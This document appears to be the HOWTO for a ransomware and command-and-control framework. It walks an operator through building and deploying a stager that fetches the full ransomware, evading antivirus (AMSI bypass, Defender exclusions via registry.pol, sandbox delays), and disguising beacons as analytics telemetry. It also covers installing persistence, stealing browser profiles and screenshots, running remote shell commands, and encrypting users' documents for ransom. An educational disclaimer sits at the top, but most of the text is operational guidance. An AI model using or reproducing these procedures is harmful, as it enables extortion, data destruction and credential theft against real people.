# HOWTO — RogueByte's C2 Framework

> **WARNING:** Educational use only in isolated, controlled environments (VMs, lab networks).
> Only run on files you own or have explicit permission to encrypt. The authors are not
> responsible for misuse.

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Project Structure](#project-structure)
4. [Quick Start](#quick-start)
5. [Dashboard Walkthrough](#dashboard-walkthrough)
6. [Agent Commands Reference](#agent-commands-reference)
7. [Staged Deployment (AV Evasion)](#staged-deployment-av-evasion)
8. [Building for Production](#building-for-production)
9. [Auto-Deploy](#auto-deploy)
10. [Terminal Usage](#terminal-usage)
11. [File Targeting & Encryption Format](#file-targeting--encryption-format)
12. [Traffic Obfuscation](#traffic-obfuscation)
13. [Persistence](#persistence)
14. [Cross-Platform Notes](#cross-platform-notes)
15. [Troubleshooting](#troubleshooting)

---

## Overview

This project simulates ransomware in a controlled environment. It demonstrates:

- **Hybrid encryption** (RSA-2048 + Fernet) — files encrypted with a random session key,
  wrapped with an RSA public key
- **C2 (Command & Control)** — agents beacon to a central server; operators issue commands
  via a WebSocket-connected React dashboard
- **Traffic obfuscation** — beacon traffic is Fernet-encrypted and disguised as analytics telemetry
- **Persistence** — survives reboots via systemd (Linux) or Registry Run key (Windows)
- **Cross-platform** — same Python codebase runs on Linux and Windows
- **Staged deployment** — lightweight stager (`hw_detect`, pure stdlib) downloads and spawns
  the full ransomware binary (`gpu_helper`) to bypass AV static analysis
- **WebSocket dashboard** — real-time victim updates, command logs, terminal, light/dark themes

---

## Architecture

### Direct Deployment

```
┌──────────────────────┐         ┌──────────────────────────────┐
│   Victim Machine     │  HTTPS  │         C2 Server            │
│                      │◄───────►│                              │
│  gpu_helper          │  beacon │  Port 4444                   │
│  (full ransomware)   │  + cmd  │  Flask + SocketIO + Gevent   │
│                      │         │  SQLite (encrypted at rest)  │
│                      │         │  React SPA via WebSocket     │
└──────────────────────┘         └──────────────────────────────┘
```

### Staged Deployment (AV Evasion)

```
┌──────────────────┐    1. beacon      ┌──────────────────────────────┐
│  hw_detect       │◄─────────────────►│         C2 Server            │
│  (~1 MB, stdlib) │   2. "deploy" cmd │                              │
│                  │                   │  Port 4444                   │
│        ▼         │   3. Download     │                              │
│  gpu_helper      │◄──────────────────│  /download_payload           │
│  (~15 MB)        │                   │                              │
│                  │   4. Spawn +      │  Uploaded by build.py        │
│                  │      watchdog     │                              │
└──────────────────┘                   └──────────────────────────────┘
```

---

## Project Structure

```
├── agents/
│   ├── stager_linux.py     → hw_detect (Linux, lightweight first-stage)
│   ├── stager_windows.py   → hw_detect.exe (Windows, lightweight first-stage)
│   ├── ransomware_linux.py → gpu_helper (Linux, full agent, hybrid crypto)
│   └── ransomware_windows.py → gpu_helper.exe (Windows, full agent, hybrid crypto)
├── server/
│   ├── c2_server.py        → C2 server (Flask + SocketIO + Gevent)
│   ├── data/
│   │   ├── c2_data.db      → SQLite database (encrypted at rest)
│   │   ├── keys/           → c2_key.key + traffic_key.key
│   │   └── exfil/          → Exfiltrated data (screenshots, browser profiles)
│   └── static/             → React SPA build output
├── client/                 → React + Vite dashboard source
│   └── src/
├── tools/
│   ├── key_gen.py          → RSA-2048 + ECC P-256 keypair generator
│   └── build.py            → PyInstaller + Docker cross-compile build script
├── lib/
│   ├── persistence.py      → systemd / Registry persistence
│   ├── c2_client.py        → C2 beacon / command loop
│   ├── crypto_utils.py     → Encrypt / decrypt helpers
│   ├── evasion.py          → AMSI bypass, delayed exec, registry.pol
│   └── browser_stealer.py  → Chrome/Firefox/Brave/Edge profile exfil
├── dist/                   → Compiled binaries (linux/ + windows/)
├── Backup - Keys/          → RSA/ECC keypair backups
├── requirements.txt
├── README.md
└── HOWTO.md
```

---

## Quick Start

```bash
# 1. Install Python dependencies
pip install -r requirements.txt

# 2. Generate RSA keypair
python3 tools/key_gen.py

# 3. Copy the printed RSA public key into agents/ransomware_linux.py (or agents/ransomware_windows.py)
#    (replace the PUBLIC_KEY_PEM placeholder constant)

# 4. Start the C2 server
python3 server/c2_server.py
#    → Runs on http://0.0.0.0:4444
#    → Generates c2_key.key + traffic_key.key on first start
#    → Serves React dashboard at /

# 5. Run the agent (dev mode — unencrypted traffic)
python3 agents/ransomware_linux.py

# 6. Open the dashboard
#    → http://localhost:4444
```

### Development vs Production

| Mode | Traffic | Command | Notes |
|---|---|---|---|
| Dev | Plaintext JSON via `/beacon` | `python3 agents/ransomware_linux.py` | Debugging, no traffic key needed |
| Prod | Fernet-encrypted via `/api/telemetry` | Compiled binary | Requires build step, see below |

---

## Dashboard Walkthrough

Open http://localhost:4444 in a browser.

### Layout

- **Top bar** — project title, stats (online / total victims), theme toggle (🌙/☀️), server shutdown button
- **Left panel** — victim cards list
- **Right panel** — command log (latest events)

### Theme Toggle

Click the 🌙/☀️ button in the top bar. Preference is persisted in `localStorage`.

### Victim Cards

Each connected victim shows:
- **Hostname** and **OS**
- **Badges** — agent type (stager / full), status (online / offline), watchdog mode
- **Persistence** — ✅ or ❌
- **Files** — encrypted file count
- **Last seen** — time since last beacon (auto-highlights >60s as warning)
- **Actions** — command buttons filtered by agent type

Select a card to see its detail panel with full system info.

### Auto-Deploy Toggle

When enabled, the C2 server automatically sends `deploy` to any **new stager** that
beacons within 30 seconds of registration. State persists in
`server/data/auto_deploy.json` across restarts.

### Server Shutdown

Click the shutdown button in the top bar. Requires a confirmation key
(`C2_SHUTDOWN_KEY` env var, defaults to `shutdown`).

---

## Agent Commands Reference

Available commands per agent type. All commands are issued from the dashboard
(or via the REST API with `C2_API_KEY` auth).

| Command | Stager | Full Agent | Params | Description |
|---|---|---|---|---|
| `status` | ✅ | ✅ | — | Report system info, state, persistence status, file count |
| `persist` | ✅ | ✅ | — | Install systemd / Registry persistence (idempotent) |
| `exec` | ✅ | ✅ | `cmd` | Run shell command, return stdout/stderr (max 1000 chars) |
| `self_destruct` | ✅ | ✅ | — | Remove persistence, delete binaries, report back to server, exit |
| `deploy` | ✅ | ❌ | — | Download gpu_helper from C2, spawn it, enter watchdog mode |
| `encrypt` | ❌ | ✅ | — | Encrypt all targeted files with RSA + Fernet |
| `decrypt` | ❌ | ✅ | `private_key` | Decrypt all encrypted files using RSA private key (PEM) |
| `screenshot` | ❌ | ✅ | — | Capture desktop screenshot, exfiltrate to C2 |
| `pslist` | ❌ | ✅ | — | List running processes with PID + name |
| `pskill` | ❌ | ✅ | `pid` | Terminate a process by PID |
| `steal_browsers` | ❌ | ✅ | — | Copy browser profiles (Chrome/Firefox/Brave/Edge), zip + exfil |
| `scare` | ❌ | ✅ | — | Download DedSec GIFs from C2, scatter across Desktop/Downloads/Documents/DedSec, open 5 in browser windows |
| `download` | ❌ | ✅ | `path` | Read a file from the victim's filesystem |
| `upload` | ❌ | ✅ | `path`, `data` | Write data to a file on the victim |
| `network_info` | ❌ | ✅ | — | Show active network connections |
| `show_ransomnote` | ❌ | ✅ | — | Display ransom note message |
| `terminal` | ❌ | ✅ | — | Open interactive shell modal (keyboard input per line) |

### Command Log Colors

| Color | Command |
|---|---|
| 🔴 Red | `encrypt`, `steal_browsers` |
| 🟢 Green | `deploy`, terminal output |
| 🟡 Yellow | `decrypt` |
| 🟣 Purple | `persist` |
| 🔵 Blue | `exec`, `download`, `status`, `network_info` |
| 🟠 Orange | `self_destruct`, `pskill` |
| 🩷 Pink | `show_ransomnote` |
| 🟢 Cyan | `scare` |

---

## Staged Deployment (AV Evasion)

Windows Defender and other AVs flag the full `gpu_helper` binary due to its crypto
library imports (PyCryptodome, Cryptography). Bypass this with two-stage deployment.

### Stage 1: hw_detect (Stager)

A ~1 MB binary with **zero suspicious imports** (pure Python stdlib):

| Technique | What it does | Admin needed? |
|---|---|---|
| **Delayed execution** | Sleeps 30–90s on startup to evade sandbox analysis | No |
| **AMSI bypass** | Patches `amsiInitFailed` in PowerShell | No |
| **Registry.pol exclusion** | Writes Defender path exclusion via Group Policy file, runs `gpupdate /force`. Looks like SYSTEM applied policy | No |

### Stage 2: gpu_helper (Full Ransomware)

Once the stager has beaconed to C2:
1. Operator clicks **Deploy** in the dashboard
2. Stager downloads `gpu_helper` from `C2/download_payload`
3. Writes it to `%TEMP%\gpu_helper.exe` (Windows) or `/tmp/gpu_helper` (Linux)
4. Spawns it
5. Enters **watchdog mode** — if gpu_helper dies, re-downloads and re-spawns

### Workflow

```
1. python3 server/c2_server.py       # Start C2
2. python3 tools/build.py            # Build hw_detect + gpu_helper, upload payload
3. Copy hw_detect to target machine
4. hw_detect beacons → "Stager" badge in dashboard
5. Click Persist → survives reboot
6. Click Deploy → downloads + spawns gpu_helper
7. Dashboard switches to "Full" badge (or "Stager (wg)" watchdog)
8. Click Encrypt → encrypts targeted files
```

### Dashboard Badges

| Badge | Meaning |
|---|---|
| `Stager` (blue) | hw_detect beaconing, not yet deployed |
| `Stager (wg)` (yellow) | hw_detect deployed gpu_helper and is watchdogging |
| `Full` (red) | gpu_helper running directly |

---

## Building for Production

```bash
# 1. Start C2 server first (generates traffic_key.key)
python3 server/c2_server.py

# 2. Run build script
python3 tools/build.py
```

The script will:
1. Prompt for `C2_SERVER` URL (or set `C2_SERVER` env var)
2. Read `traffic_key.key` from server
3. Generate `agents/settings.py` with embedded config
4. Compile **hw_detect** + **gpu_helper** for Linux (native PyInstaller)
5. Cross-compile both for Windows (via Docker: `cdrx/pyinstaller-windows`)
6. Auto-upload `gpu_helper` to the C2 server's staged payload
7. Output to `dist/`:

```
dist/
├── linux/
│   ├── gpu_helper         # Full ransomware (ELF, ~15 MB)
│   └── hw_detect          # Lightweight stager (ELF, ~1 MB)
└── windows/
    ├── gpu_helper.exe     # Full ransomware (PE, ~15 MB)
    └── hw_detect.exe      # Lightweight stager (PE, ~1 MB)
```

### Environment Variables

```bash
C2_SERVER=http://192.168.1.100:4444 python3 tools/build.py
C2_API_KEY=your-secret-key       # For REST API auth on the C2
```

---

## Auto-Deploy

When the **Auto-Deploy** toggle is enabled in the dashboard, any new stager that
beacons will automatically receive a `deploy` command within 30 seconds of its
first registration.

- State is saved to `server/data/auto_deploy.json` (survives server restarts)
- Toggle state syncs to all connected dashboard clients via WebSocket
- Only applies to **new stagers** (not already-deployed or full agents)

---

## Terminal Usage

The `terminal` command (full agent only) opens an interactive shell modal:

1. Click **Terminal** on a victim card
2. Type commands in the input field
3. Press Enter to execute
4. Output appears in the terminal history
5. Previous executed commands are saved in the modal

Each command is sent as an `exec` to the agent, results stream back via log.

---

## File Targeting & Encryption Format

### Targeted file types

```
Documents: .txt, .pdf, .odt, .docx, .doc, .xls, .xlsx, .ppt, .pptx
Images:    .jpg, .jpeg, .png, .raw, .psd
Video:     .mp4, .mov, .avi, .mkv
Archives:  .zip, .rar, .7z, .tar, .gz
Databases: .sqlite, .db, .sql
Certs:     .pem, .key
Code:      .py, .js, .json, .env
Backups:   .bak, .backup
```

Target directories: `/home` (Linux) or `C:\Users` (Windows).

### Encrypted file format

```
"RogueByte" (9 bytes) | key_length (2 bytes) | encrypted_session_key | Fernet ciphertext
```

The `RogueByte` header prevents double-encryption.

---

## Traffic Obfuscation

When compiled and deployed, beacon traffic is obfuscated:

| Technique | Detail |
|---|---|
| Payload encryption | Fernet-encrypted JSON in `data` field |
| Fake endpoint | `/api/telemetry` with analytics-style query params (`app=chrome&v=1.0`) |
| User-Agent rotation | Random real browser UA each beacon |
| Fake HTTP headers | Origin, Referer, Accept, Accept-Language |
| Beacon jitter | Random +0–30s added to interval |
| Fake data fields | `screen_res`, `lang`, `tz` inside encrypted payload |
| Response mimicry | Looks like a real analytics API response |

### Raw HTTP request

```
POST /api/telemetry?app=chrome&v=1.0&_=1781624005724 HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ...
Content-Type: application/x-www-form-urlencoded

data=gAAAAABqMWb2hP4FsTe9pdpRqL...Yj8dMXQyVtWv&v=1
```

### Response

```json
{"success": true, "message": "ok", "poll_ms": 60000}
```

The actual command is hidden in `config.flags` — also Fernet-encrypted.

---

## Persistence

### Linux (systemd)

| Component | Service name | Unit file |
|---|---|---|
| Stager (hw_detect) | `hw-detect` | `~/.config/systemd/user/hw-detect.service` |
| Ransomware (gpu_helper) | `gpu-helper` | `~/.config/systemd/user/gpu-helper.service` |

Enabled via `systemctl --user enable`. Starts on user login (or at boot with linger).

### Windows (Registry)

Run key under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`:
- `hw-detect` → path to `hw_detect.exe`
- `gpu-helper` → path to `gpu_helper.exe`

Runs on every user login.

### Watchdog Behavior

When the stager deploys the full ransomware, it keeps its own persistence.
After a reboot, the stager starts first, checks if `gpu_helper` is running,
and if not, **re-downloads and re-spawns it**. This makes the infection resilient
to process termination.

### Self-Destruct

Send `self_destruct` to either agent. It:
1. Removes its own persistence
2. Kills its own process
3. Deletes its binary + suicide note
4. Reports `self_destructed` to the C2 server
5. Server removes the victim from DB and emits `victim_removed` via WebSocket

**Important:** If both stager and full agent are present, send `self_destruct`
to **both** to fully clean the machine.

### Idempotency

`persist` when already persistent returns `"already persistent"`. The dashboard
greys out the Persist button when ✅.

---

## Cross-Platform Notes

| Aspect | Linux | Windows |
|---|---|---|
| Target dirs | `/home` | `C:\Users` |
| Persistence | systemd user service | Registry Run key |
| Python command | `python3` | `python` |
| Binary name | `gpu_helper` / `hw_detect` | `gpu_helper.exe` / `hw_detect.exe` |
| Temp directory | `/tmp` | `%TEMP%` |

### Building for Windows

The build script auto-cross-compiles via Docker (`cdrx/pyinstaller-windows`).
If Docker is unavailable:

```bash
# On a Windows machine with PyInstaller:
pyinstaller --onefile --name gpu_helper.exe --paths lib agents/ransomware_windows.py
pyinstaller --onefile --name hw_detect.exe --paths lib agents/stager_windows.py
```

---

## Troubleshooting

| Problem | Solution |
|---|---|
| `No module named 'Crypto'` | `pip install pycryptodome` |
| `No module named 'flask'` | `pip install flask flask-socketio gevent` |
| Dashboard shows no victims | Check `C2_SERVER` URL in config, firewall, agent is running |
| `traffic_key.key not found` | Start `server/c2_server.py` first — it generates keys on first run |
| `hw_detect` shows ModuleNotFoundError | This should use only stdlib — something is wrong with the build |
| Build fails on missing Docker | Install Docker or build Windows binary manually |
| `/download_payload` returns 404 | No payload uploaded. Run `build.py` (auto-uploads) or upload manually |
| Dashboard shows "Stager" after clicking Deploy | Wait for next beacon cycle (~60s) — stager downloads + spawns, then reports back |
| Stager Deploy button stays greyed | Stager reported `deployed: true` — already deployed |
| Persist stays ❌ after clicking | Wait for next beacon cycle (~60s) |
| Registry.pol exclusion fails silently | Some Windows versions (Home) lack Group Policy — it's not critical |
| Screenshot or browser steal returns nothing | Ensure agent has appropriate permissions on target |
| Terminal shows no output | Commands are sent one per Enter — use simple commands first |
